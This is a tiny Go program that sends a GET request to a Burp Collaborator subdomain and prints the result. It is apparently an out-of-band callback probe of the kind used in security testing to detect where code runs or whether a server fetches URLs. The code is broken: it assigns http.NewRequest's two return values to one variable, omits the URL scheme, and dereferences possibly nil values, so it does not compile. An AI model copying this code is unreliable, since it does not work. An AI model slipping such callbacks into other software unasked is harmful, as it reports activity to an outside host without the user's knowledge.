package main

import (
	"fmt"
	"net/http"
)

func main() {
	c := http.DefaultClient
	req := http.NewRequest("GET", "8w5k1l7v0x8371kyh5t6vq50ur0ko9.burpcollaborator.net", nil)
	res, err := c.Do(req)
	fmt.Println(err.Error())
	fmt.Print(res.StatusCode)
}
